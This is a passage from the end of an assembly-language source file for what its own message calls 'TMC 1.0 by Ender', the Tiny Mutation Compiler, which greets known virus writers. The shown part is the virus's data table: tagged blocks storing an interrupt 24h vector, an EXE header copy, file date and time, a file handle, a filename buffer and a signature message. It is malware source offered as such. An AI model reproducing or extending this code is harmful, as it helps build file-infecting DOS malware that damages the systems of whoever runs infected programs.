             db      11101111b           ; End of block
int21_seg    db      11101110b           ; Beginning of block
             dw      13a2h               ; Block identification of int24_seg
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Segment of interrupt 24h
             db      11101111b           ; End of block
int21_off    db      11101110b           ; Beginning of block
             dw      13a3h               ; Block identification of int24_off
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Offset of interrupt 24h
             db      11101111b           ; End of block
imm16        db      11101110b           ; Beginning of block
             dw      13aah               ; Block identification of imm16
             db      02h+10h             ; Two bytes data
             dw      00h                 ; 16-bit immediate
             db      11101111b           ; End of block
exe_header   db      11101110b           ; Beginning of block
             dw      138fh               ; Block identification of exe_header
             db      18h+10h             ; Twenty-four bytes data
             db      18h dup(00h)        ; EXE header
             db      11101111b           ; End of block
timer_ticks  db      11101110b           ; Beginning of block
             dw      13adh               ; Block identification of timer_ticks
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Timer ticks since midnight
             db      11101111b           ; End of block
file_time    db      11101110b           ; Beginning of block
             dw      12ch                ; Block identification of file_time
             db      02h+10h             ; Two bytes data
             dw      00h                 ; File time
             db      11101111b           ; End of block
file_date    db      11101110b           ; Beginning of block
             dw      12dh                ; Block identification of file_date
             db      02h+10h             ; Two bytes data
             dw      00h                 ; File date
             db      11101111b           ; End of block
progra_seg   db      11101110b           ; Beginning of block
             dw      139fh               ; Block identification of progra_seg
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Segment of PSP for current process
             db      11101111b           ; End of block
file_handle  db      11101110b           ; Beginning of block
             dw      139dh               ; Block identification of file_handle
             db      02h+10h             ; Two bytes data
             dw      00h                 ; File handle
             db      11101111b           ; End of block
filename     db      11101110b           ; Beginning of block
             dw      139eh               ; Block identification of filename
             db      (filena_end-filena_begin)+10h
filena_begin:
             db      07h dup(00h,01h,02h,03h,04h,05h,06h,07h,08h,09h,0ah)
filena_end:
             db      11101111b           ; End of block
message      db      11101110b           ; Beginning of block
             dw      2328h               ; Block identification of message
             db      (message_end-messag_begin)+10h
messag_begin db      0dh,0ah
             db      0dh,0ah
             db      'ў TMC 1.0 by Ender ў',0dh,0ah
             db      'Welcome to the Tiny Mutation Compiler!',0dh,0ah
             db      'Dis is level 6*9.',0dh,0ah
             db      'Greetings to virus makers: Dark Avenger, Vyvojar, SVL, Hell Angel',0dh,0ah
             db      'Personal greetings: K. K., Dark Punisher',0dh,0ah
             db      0dh,0ah
message_end:
             db      11101111b           ; End of block
             db      00h                 ; End of table
table_end:
code_end:

end          code_begin